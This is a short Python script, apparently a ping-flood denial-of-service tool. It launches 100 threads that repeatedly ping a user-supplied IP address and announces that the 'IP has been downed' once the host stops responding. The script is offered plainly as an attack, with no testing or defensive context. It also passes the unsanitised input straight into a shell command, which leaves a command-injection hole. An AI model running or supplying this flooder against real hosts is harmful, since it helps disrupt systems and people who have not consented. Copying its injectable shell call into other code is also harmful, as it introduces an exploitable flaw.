import os
import threading
import time
import colorama

colorama.init()

GREEN = colorama.Fore.GREEN
RED = colorama.Fore.RED
RESET = colorama.Fore.RESET

def is_connected(ip):
    """Pings the IP once and returns True if it's online, False if down."""
    return os.system(f"ping -n 1 {ip} >nul 2>&1") == 0

def ping(ip):
    """Continuously pings the target IP."""
    while is_connected(ip):
        print(f"{GREEN}[+] IP {ip} Pinged {RESET}")
        os.system(f"ping -n 1 {ip} >nul 2>&1")  
        time.sleep(0.1)

if __name__ == "__main__":
    target_ip = input("Enter the IP to ping: ")

    threads = []
    for _ in range(100): 
        t = threading.Thread(target=ping, args=(target_ip,), daemon=True)
        t.start()
        threads.append(t)

    print(f"Pinging {target_ip} rapidly...")

    try:
        while is_connected(target_ip):
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping pinger.")

    print(f"{RED}[-] IP has been downed {RESET}")
    input("Press Enter to exit...")
